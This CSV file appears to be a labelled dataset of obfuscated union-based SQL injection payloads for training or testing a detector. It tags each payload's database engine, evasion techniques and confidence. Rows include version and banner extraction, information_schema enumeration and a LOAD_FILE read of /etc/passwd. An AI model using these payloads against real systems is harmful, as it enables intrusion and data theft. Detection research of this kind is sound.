payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"sElEcT * FRoM uSErs whErE ID=0o1+ oR 0x5|uNIOn+SELECt 3O6X0X1,BaNNER frOm{v$VeRSiON=WHeRE roWnUm =_/*|ib^E*/0X0 And ""y"" NOt lIke ""Y@""; OR "" Z"" NOt Like "";z""<AND tRue oR!""Gp""/**/LIkE or 2614=2615 OR False#""GpE"" -- (SELECT.(sELeCt (SeLEct (SELECT 3))))| X~!O",union_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.41,rule,sqliv5_json,string_double_quote
"/**/sELecT * froM uSErs WHeRE id LIKE 2x1 <@$$ unIon SeLECt (seLeCt (SELECT 0)),verSiOn (` ) oR fALsE && 'F' NOT LIKE 'Fe' --=3!\w",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"SELeCt * frOM users wHere*ID Like (seLECT 0o1) Or (seLECT (SELECT 4)) and =TruE Or fALsE || False#""@ UniON SELEct 'a',vErsiON ( { ) -- 0b0O1lI%@",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"sElECt * fRom>USerS wHERe iD liKE (sElect (selECT 0x4)) UNIoN SELECT .0b0b0b105_,vERsiON ( = ) -- (SELECT (SELECT 7))*",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"SElEcT * FRoM uSerS WHERE Id = (SeLECT (SELEct 1)) <0X7 ;and ""tRuE_Or (seLEcT 0) And |TRue AND TRUE or 0xd32 nOT LIke 0xEC2 OR/*='ii}*/FalSe## uNIoN SElECT 0o0b4,vERsIOn- ( ) -- (selecT (seLECt (SELECT 1)))}>b",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"seLeCT=* FRom USeRS wherE(iD like (SELeCt 0B0x0o0o1)""+ $+*\ UnIOn SEleCT Null,@@VErsiON ^ OR ? False AND "" ;sTi"" NOT LIKE "" ;sTi|"" -- 0",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,string_double_quote
"seLeCt * FrOm uSerS WHeRe Id LIKE (SeLect (selECt (SELECT (SELECT 1)))) <@$_ UNiON SELEcT 0O2,VErSION ( ) aND!""%-""=""%-""'-- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_json,string_single_quote
"UnIoN selecT 1x8,loAD_fiLE ]( '/ETC/PassWd' )_ ,(sELeCt (sELecT 0o6)),(sElECt=0X2),0O7;",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"seLeCt *;frOm)uSErs wheRE/iD/*)*/ = (sEleCt (SELECT 1)) Or \<2X1]UNioN SElECT`(seleCT 0o3),@@VeRSIOn Or`faLse OR ""L""!=""L"" oR,FalsE oR 0 OR False -->7",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,numeric
"SELECT * FRom usErS WHErE iD =/*;&?OB GB=GeZ*/0x9 or \+<$)unioN seLect (SeLecT (SELECT (SELECT 1))),@@VERsIoN \ OR FALse!AND True -- 0o0B1b0o161",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"seLECT * fROM""uSErs WHeRE id = (SELECT (SELECT 1)).~ aND 6 uNIon SelEcT (SELECT 3),VersIon ( ? ) /*5)$\+i*/ AND True AND;3 OR False --(1",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,numeric
"SeleCt * froM&USeRs WHeRE Id /**/= 0o3 + &( \ ) Union SeLect nULL,@@VErSiON oR (SELECT (SELECT (SELECT (SELECT 4)))) OR False OR False -- 0x1| H",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"SELEcT~* frOm Users WheRE id LikE (SELECT 8) UNIon sELeCt .(SeLEcT (SELECT 6))$_,vErSIoN ( ) OR FaLsE AND 1 -- 0B13K9",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"SELect *'from users.wHERE ID = '0B9' OR ?FAlse or[ fALsE""Or^""<?`&""<>""<?`&""*Or FALse and ""b""<>""b+"" && (seLeCt 0xc90)=(SELect (seLECT 6220)) or (SELecT (sEleCt (sELect 6)))#or $). =?~7x0o10 uNIoN SELecT 5X3,@@VErsioN~or FALsE -- 9'VLH]U&'(Mby",union_based,mssql,case_variation,0.46,rule,sqliv5_json,string_single_quote
"^SELecT * frOM USErS<wHeRE AND TruE Or False && '9`&[' nOT LiKE '7`&[T' aND (sElecT 9X3) ANd TRUe Or faLSE ANd (selECT (SElEct 0x1)) oR FALsE#id%[=] 0O4O5<@..,UnIOn SEleCT 0b0X0,VeRsion ( )@ -- 0O1h }$KP<8gc",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,unknown
"SElect * fROM usERS WheRE id =>'6' + @ 2O4 UnIoN sElECt,0B120o0O4o0o8X0o10,VErsiON &( ) % Or ""S)"" NOT LIkE ""S)""=oR (SElECT (seLEct (SELECt (sELEcT (Select (SELECT 0)))))) oR '""DiD"" NOT LIke ""did"" or fAlSe oR 0X15BE Like 0x15bc aNd (SElECT 0O1) OR False -- 0o1'""jUk/OB2[[V",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"UNIon?selEcT/*]U`z*/*>fROM useRS_wheRE@logiN ANd<;'egg']noT LIKe`'eGG \ OR falSe#'#== ^""CHaR ...n~ng1",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,string_single_quote
"=SelEct * fRom useRS{WHeRE id=7x0b0 unIoN/**/SeLECT (sElEct (SELEct (seLeCt (SELECT 7)))) ||+@,vErSIon ( )^< +Or 0x1a2e=(selEcT 0X0X0o1a7B)| oR 'OU' LIKe /*{Z?f`*/'Ou%' Or (SELEcT (seLeCT 0x15FC)) nOt LIKe\(seLeCt 0x17fc) OR FALSE -- 0X1<d\\ZPAs<%",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"SeLeCT * FRom users`WhEre?ID ]likE: ['6'(OR """"<@<unION sElEcT (SEleCT 8o0O0x9b0o0B5),versiOn ( ? )' ? ANd [True -- 6O3o0o2O2'TXZGD{",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"SEleCT *=frOM uSERs WHEre iD =, '0o5' ||0o0X0b1 unIOn SELect (SELECT 0b1),BANNer from v$VerSiOn wHerE RowNuM = (SELECT (SELECT (SELECT 1))) oR "";<"" lIKE?"";<r"" AND 0x1 OR False -- 1'TVJ",union_based,oracle,case_variation,0.46,rule,sqliv5_json,string_double_quote
"SeleCT * fROM UsErS{whEre;iD LIkE< 0x0/*Ot O*/oR \< =0b0b0X3 UNiON`SELEcT (selecT (selECT (SELECT (SELECT 4x1)))),@@verSIon OR False -- 0x0b1Dxb6",union_based,mssql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"SeleCt * FrOm usERs WHEre Id =< 0x0B100O7 UNIOn sELecT (seLECT (seLECT (sELecT?(seLECt 1))))<@$,vERSiOn ( )! And TRUe And ' '=' ' anD 'W' NOT{liKe 'Wi'/**/aNd (sEleCt (SeLecT (SELECT 5153))) nOT lIke (select 6158) AND tRuE AnD 1 or 0 AnD 'Cw' noT lIkE 'cwk' --/**/1Fe",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.7,rule,sqliv5_json,string_single_quote
"'SelEct~* FrOm(UsErS whEre/* 0b111R*/id!~LIkE ]0o8b5B7O0b0O49140734o1<*\ UNION:seLECT nUll,@@vERsIon && <TRuE Or'FAlSE -- 1bK9Z",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
",select *}FroM usErS wheRe-Id like/*)rN*/ '0o1'[Or !<@ UniON,SELEct;(seLect~0o0O7X0O1),VersIoN (~ )\ OR;'Hg '='Hg R'& OR; false AND?tRUe Or AND (SELECT 1)#faLsE AND (seLeCt (SElEcT (SELECT 1))) -- 0O0'PQF tBE=",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"SELeCt/*|{bSl%9$*/* frOm useRS Where|ID* likE '3o6'<@.. UnIon SeLECt;0x0b0O0o0O0X9O0x2,veRSIOn ( )' Or "";"" nOT LikE "";"" OR ""}"" LikE ""};"" && (sEleCt (sElecT (sELeCt (SeLECt 8250))))!=4X0XCbB && "":"" NOt like "":t"", OR """"""$nOt lIke """""" And (SelEct 1) or faLse aND 1 And TrUE OR fALSe and (sELecT (SELECT (SELECT 0x139a)))<>5019 anD TRue :&& ""ey""!=""eyS"" OR<False -- 0o0B0o4O1'&#A4RL?A-&i)}(",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_double_quote
"SELEct `* froM users WheRe)iD liKE 0B0O3x4 <@.$ unION seleCt (seLECt (SELECt 1)),vERsIon /**/( ) && true oR ""P""=""PS"" Or ""^""/nOT like ""^"" oR faLse ANd $True or FALSE -- 11",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"selecT * FROM uSeRs WheRe Id* liKe 0x0O7 or $ . LIKE (SeLEcT (SelEct 0O4X7)) unIon]SELecT (sEleCT 1X0O1),@@VersiOn/*}P Rja8c{*/--?8J K",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"}sELEct * FROm uSErs WhEre;id< LIkE^?9x6X0X1 +$ . UnION*SeLecT NulL,@@VeRsiON] OR (SelecT 0o0x5) Or fAlsE`-- 0O0B2O0O0z",union_based,mssql,case_variation,0.46,rule,sqliv5_json,unknown
"seLECT *;frOM uSErs$WhERE""ID<=<0B0XaX5 |oR 7x0x5 or ""4"" Not lIKe<""4"" oR (sElECT (sELECT 0x0)) or fALSE AND True#""? UniON SeleCT`NULL,VeRSiOn/*:y9:r*C&RW*/;( ? ) -- 0b10B0b0o0b1305X0o1""`d+",union_based,nosql,case_variation|inline_comment,0.53,rule,sqliv5_json,unknown
"SelECT * froM Users Where Id = 7 UniOn SElecT +!<(selEct 5x1),VERSION ( ) aNd TRuE oR FALsE or 0 Or FaLSe -- 1DA",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"SElect *""frOM$UserS WHERe ID lIke ] (sELecT:(SELECT 1)){uNion SeleCT !<0x1,VerSIon ( ) oR fAlSE -- 1B{",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"SelECt * fROm.UsErs.wHeRE ID (= $'4B7b0X0O7o0B1' unIoN SeLeCT&\>; OR (SELECT 0X0) And (seLECT (sELEcT 1));OR''P' liKe 'P""' Or FaLSe OR`FAlsE OR/*<).ts!}uv */fALsE or FAlsE aND tRue(AND True OR False#,@@VerSION(--,0b11x8'I4T",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"seLEcT * fROm USeRS wHere!Id liKE 0X0 Or 0B100 OR ''E'=''Ef'+and TrUE#""{ UnIoN seLect (SeLEct~(sELEct (sELeCt (seLEct 0x3)))),VerSIoN ( * )* -- 0x0b101)j[r",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv5_json,unknown
"SElEcT * fROm Users""whErE ID = 0x4 or$@` Or 0B151000118001!=(SelECT (sElEct (seleCT (sELEcT 0Xa3D)))) or 'za,R'<>'Za,R' OR fALsE Or "";""<<> "";"" OR fALsE && ""P"";Not lIKe'""Pu"" && tRue#"", = 0x0x7 UNion SELEcT (SElECT 0O0X1),VErsIOn/*BD(s]]8ieQ3*/ ( ) -- 1pi =r",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,string_single_quote
"SelEcT * FroM USerS WheRE iD LIKE (sELEcT 0o1) +2X0o4 uNION selECT/*LL}*/nULl,bANnER frOM v$VErsiON WherE ROwNum liKe 5o1 oR fAlse!Or FALSE or ' '<>' ' OR False OR False -- 1",union_based,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,string_single_quote
"seLeCt,* From=USerS,Where id\= (SeLECT=(SeLeCT 0x1))]+ $+%0x1$uNion,sElECt nUll,@@versIOn! > anD 0X0X2 Or fAlSE && trUe OR^"";8""!="";9""aNdtrue^Or (SElECT (SELECT 0)) -- 0O6X1o1 Kh",union_based,mssql,case_variation,0.46,rule,sqliv5_json,unknown
"SeLeCT * From UsERS wHERe iD LiKe (SElECT (sElect (SELECT 1))) or (seLEcT 2) anD (SElect (selECt 1))#""? UnioN SEleCt vErSioN ( ) ,VeRsioN] ( ) -- 0b1O1p4",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"seLeCt * fRom useRs wHere id] =/*0o5pYNj*/ '6' UNIoN SELeCt !<0,VErsiOn ( ; ) ANd trUe or (SELEcT 0) AND ""Yw"" NOT LIKE ""Ywi"" AND True OR False OR False -- 0o1'n,<G22g(e",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"SelECt * froM}uSers Where iD lIKe 6x1 oR \<\. uNION sElEcT 2O5B0b0O0O5,@@veRSioN AnD (SelEct (selECT (sElEcT (selECT 1)))) or '? ' nOT LIke '? ' Or falSe AND ""<"" nOt LIKe ""<^"" -- 0o0O1SCk?<aw",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,string_double_quote
"!SeleCt<*^fRom uSErS&WherE id: ^{""=<[_)""'5' UnioN\SeLeCT+\,@@VErSIon<---0b0b4b0o0O0o0b101B0b6O8O8b1010900'x\qEG",union_based,mssql,case_variation,0.46,rule,sqliv5_json,unknown
"SELecT * FrOM USErS wHerE id lIKE 0x0o10o8. unION selECt]NulL,baNneR;FRoM v$VersiOn,wHere RowNuM LikE 0O0x2 and 'gx'? NOT = !'gX>' or ""w"" Not lIKe ""W"" OR 0x0 or)FALse anD~""wOcV"" Not lIkE ""WOcvT"" And trUE oR FAlsE -- 0o5dg!h u(y)7mMG",union_based,oracle,case_variation|function_alternative,0.46,rule,sqliv5_json,string_double_quote
"SElect)* FrOM]usERS WHeRE%id lIKe '3o2' oR 0O9X0b1^% LIkE 0b0x0 UnIOn sELect^(sElECt 5),bAnnEr`FROM V$VERsION wHerE roWnUM lIke (sELeCT 6) or FAlSe Or 6X0/*GM,gC*/ or FaLSe AND 0x745!=0x776`oR faLSE oR falSe||False OR fAlsE AND True OR False -- 0b0x3'}$>c1cTJA",union_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"Select *(FRoM USERs WhErE)iD! =? '0O11O9' UNION sElect ""?""_,VErSion ,( ) Or (SEleCT (seLeCt 0)) And TRue OR (SElEct 0) --|5B0B0o5'DKe",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"{sELect&* frOM uSers*WHEre Id {= 0x4o0o13X0x7x1 oR 4B0O0x0b0o0x4 oR fALSe Or fAlse oR faLSE anD TruE^ AND 0x8aE LiKE (SELEcT (selEcT (sEleCT (SELECT 2227))))#"", uNIOn}SElECT NUll,vErsiON ( : ), :--{0b9X1[0B11t",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"~Select_*`from uSErs wheRE?Id/*g& T*/ !lIke. ""'3x9B2''uNion SEleCT $ .,@@vErsIon oR 'nvp|'='nVP|,'` oR ; FAlSE &&_7x1 `And* TRuEANdtruE;--@1o2'g~(SELEcT~(SELeCt/*]*(SelEcT 8)[K]$i*/0x3)),j0x0B102?0I:&g",union_based,mssql,case_variation|comment_whitespace|inline_comment|hex_string,0.41,rule,sqliv5_json,unknown
"sElEct * from USeRS wHErE id LiKE 0x0b12 Union""SElECt Null,BANnEr fRoM v$veRSioN WHERE roWnum'=~5x1/**/or fALSE && trUe{-- (SelECt (SELECT 4))@WAH$P",union_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"%Select *\from USERs WhEre ID = 0x0b110 OR/* ANd\(SELECt 2x1) [ aND True anD ""S""!=""s0o0b0X0B10"" AND ? truE [OR fAlSe;aND "",="" NoT LIke "",=&"" OR False OR False OR False#""a-h! ^myaKz?me/go_5 >m> G'TTy*/@<@ =.(SelEct 3O0) uniOn SeLect{6x1,verSIoN (*=\&)`/ And?"":@""<>"" @D"" --!(sELeCt (sELECt 0x1)) :Ub7>'V",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_double_quote
"SeLECt *_frOm usERs)WhERe ID )= /(SElecT (SELECT (SELECT (SELECT 1)))) + \+%(SelEcT 5O0X5) unION SElECT nuLl,@@veRsiOn AND trUe ANd ""Ls"" NOT LIKE ""Lsj"" OR False AND 'M' NOT LIKE 'MI' -- 3k",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,string_single_quote
"Select * fRoM'USERS whERE<id &=_ 0o0O0b0O6o7 *\. UnION;selecT NULL,@@VErSiON^or 'H'!='h' And?'f'!='f}' or FALse OR False -- 0mjlCl",union_based,mssql,case_variation,0.46,rule,sqliv5_json,unknown
"SElEct * from useRS WHERe ID = <(sElEcT 2) UnION sELect (SELEct (SElEct 1))<@,vERsIoN ( < ) && ""7j0b110Y""=""7J6y"" or=')T' Not lIkE ')t' anD tRue ANd trUe or 'r' NOT Like 'R' OR False -- 1L",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"?sElECT *&FrOM uSeRs}wHeRe iD LiKe 0b0x0O0B0x1 +'\+*\ UnIoN seLECt nuLl,@@VeRsIon/aNd TRuE And_""G""=""g""AND'oL' noT likE 'oLm' oR ""@"" NOT'liKE ""@"" And TRUE'ANd TrUE && TRuE aNd (SeLECt (selECt^(SeleCT{(SELECT (SELECT (SELECT 855)))))) NoT liKE 6B1010891110 Or faLse ANd OR False && True#true -- 0O4o0o0O4b10R ]?V\(selEct 0x6):+hw..-",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,string_double_quote
"SeLECt * FrOm/*gWpeF*/usERS whERe iD(like 7X5.Or 1X1 And (sElECt (SEleCt (SeleCT (SELECT 3)))) _Or FalsE Or (SelEcT (SeLeCT (sELeCT 0XeD))) not LIkE 1Xec and TRuE Or ""n""<>""n"" AND tRue;AND 's'='s'#"". UNIOn*sELEct VERSiON (: ) =,VersiON ($ ) --]5x8O0x6o1X\""Q",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.7,rule,sqliv5_json,string_single_quote
"selECT * FRom useRS WhEre iD lIkE (sELeCT (seLeCT (SelECt 4))) UnIOn selECt @^2x1$,VErsIoN; ( _ ) ANd trUE oR (sELECT 0) aNd (SELECT 9684) != 9605 -- 16lDx",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"Select * fRom]uSers wHERE/*>?nG*/ID& =& 0B0b0B1023 unIon?sElECT+@ 0B6a,veRsioN ( + ). :AND {trUe oR!""jM"" _not like :""JM"" Or ""p:BB"" NOt]lIKe ""P:bb""_-- 9o6X10",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"SELeCT *""fROM USErs whErE(iD+ LIKe 0B0X0b11e9x0B0O1/Or: @$ ~ ;oR faLse[oR (seLEcT (SeLECT (sElEct (selECT (SELEcT (SelECT 0x0)))))) Or falSe# likE/**/0X1}UNIoN.seLECT""0x4,VERsiOn /**/( ) -- 1n}Ub",union_based,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.8,rule,sqliv5_json,unknown
"SeLEcT * FRom<USERS wHEre Id} liKE '4' Or (/ \. /*C*R\`&[K*/) liKe 0b1001X3X1 uNioN<sELeCt (selECT (SelecT (SELECT (SELECT (SELECT 0b1))))),@@vErsiOn]aND '@{Z'[!=''@{zZ' anD '{I' [LIkE ""'{I' or (seLEcT (sELEcT 2x5)) -- 9x0b9b2'v OR False Or (seLect (SELECT (SELECT 0x0))) Or fAlSe oR 'Z]O'!='Z]o' Or fAlse OR 'b/' NOT LIKE 'b/' OR False OR False OR (SELECT 0)#YZ$a>B{",union_based,mssql,case_variation|inline_comment|function_alternative,0.46,rule,sqliv5_json,string_single_quote
"SELEct * frOm uSeRS whEre}iD = '0b4' uNion SelECT 0o5""!"",baNnEr FROm(v$verSIOn wHere ROwNuM lIKE (SeLecT 0o1) and (seLeCT (SELECT 1)) -- 7'wY",union_based,oracle,case_variation,0.46,rule,sqliv5_json,unknown
"<SELecT * fROm UseRS whERE Id LIkE (SELECT 11)<(sELecT 1) oR 0# uNioN SeLeCt (SELECT 3),VerSIon ( ) -- 1:;",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"selECT *\froM%uSERS`WhErE{iD+=|'0O0B3' oR]\.<8X6]uNIon sEleCt;0O1b0O1,@@VErSiON^and (seLEct (SelEct 0X1)) or (select 0X808) NOT LIKE (SELECT 9041) OR (sElecT (SELEcT 3330)) NOT LIKE (SELECT 3300) --]9' )0o0B0o1750",union_based,mssql,case_variation,0.46,rule,sqliv5_json,unknown
"+sELECT *""FrOM}USErs^WHEre@id>=)'1'<<@&0B0o0O0b0O3/*?Yb*Hj\}o0]g*/uNion`SelecT 0x0,versioN\!([:?`);; --:0b0O12'",union_based,unknown,case_variation|inline_comment,0.8,rule,sqliv5_json,unknown
"SelECT;*;fRom usErs whERe id += 0X5 unION select%@<@$,versIoN) ( ) OR: fAlSE And^trUE{aND ""4X0s"" LIKe ""0S"" oR FalsE -- 0b0X1S}<mT(",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,unknown
"SEleCt * FRoM usErS""wHerE Id =_ '7' <@<@>UNIoN(selecT 0o0B8O67,versioN ( ) aND TRUE""oR_(SeleCt (sELEct (SELECT (SELECT 3)))) And/**/tRUe and truE AND (sELeCt 1)`--`0o7'f5",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"SeLECt+* fROm UsErS)WHERe}iD=0O0B1901X9[OR 0o0X0o0B0O157B0o1 && tRue or@""S""<>""S"" oR ^(seLeCt (SELECT 2)) && truE OR (seLect (SElect (SELECT (SELECT (SELECT 0))))) AND trUE and; tRuE oR (sELECt 0) AND 0x174F^noT liKe 5968 AND 1#""{^UNION:sElEcT VErSion ( )\/*Cl?[@_mW*/,veRSIoN&\( "" ) "" -- 0b000118_ny'fLei",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,string_double_quote
"{SelecT *$From UseRs WHErE*Id.}LIkE?]'0x0O2'~<@$_}UnIoN+SElecT](SEleCt 4X9),vERsioN( (. + )& --}0b5X0o0b1'iC[yjA",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"sElEcT * FrOM]UsErs wHErE Id LIKE 1 %$ (sElECT (SelECt (sELect (SELECT 7)))) unIoN seleCT NUll,@@VERSIOn Or 'o' <> 'O' Or 6 -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_json,unknown
"/**/select * FROm usERs WheRE Id{ =@ (SeLect (seLECt:(SELECT (SELECT (SELECT (SELECT 2)))))) UnIon selecT @ oR 0o7x8,VErSIoN ( ) anD 0b6 OR '%' NOT LIKE '%'!-- 13Qjco",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,like_clause
"&seLect * FRom UsERS wHeRe Id =| (sElECT (SElect (seLect 0x2))) +\+. UnIOn select nuLL,@@VErSioN} AnD TRUE -- (SELECT 1).",union_based,mssql,case_variation,0.46,rule,sqliv5_json,unknown
"UNion+SELecT * FRom usERS WHEre lOGiN lIKe chaR ( 114,(SELECT 111),0o0B1101111,(sElecT 116) ) ;",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"~sELEct * FRom uSers WherE Id `= (sEleCT (SElECt 0x1)) Or 5x0b0x1 Or ""o "" not^lIKE ""o "" OR False#""?(UNIon/*L3b[*/SELEcT (SELECT 0x1),VERSioN ( ) -- (SElect 0x9) )W?mg",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"SelECT * FROM usErs WHEre.iD -lIkE+ (SELect 1) -0O1<@ UNIOn sELEcT (seLECt (seLECt 0x2)),verSioN /**/(/*@4 KY}&Jm))(sEleCT 0x5)*/ ) ^ ANd 0B1106101180311 LiKE ? (SeLEct|0b0x3f75) aNd (sEleCT 1)ANDTrUe ANd truE?--]8u!Gt",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
) :UNIoN selEcT.* fRom INF; OR MATIon_SChEmA.TablES,union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"?SELECt * FrOm USERS whEre id lIKe '5b1' + $ ./*E%(SelEcT (SELECT (SELECT (SELECT (SELECT 2)))))*/unIoN sElECt 0b1,@@VerSIOn}-- 4X1'P",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"SELEcT""*!FroM!usERs.WhErE ID ;liKE$ '2' OR \.< ?= 0O0O8 UNioN seLect (sElEct (sELect 0X1)),@@veRSIOn]--(6o4'",union_based,mssql,case_variation,0.46,rule,sqliv5_json,string_single_quote
"sELect * FROm uSERS Where~ID* = 0x1[union SeLECT @<@,VErsION ( /*3f*P~ubW*/) [aND""(SelEcT (sElect (sELeCt (sELeCT (seleCT (sELECt (selecT (SELECT 1)))))))) OR fALse/*/,|K=D*/--\7B2",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
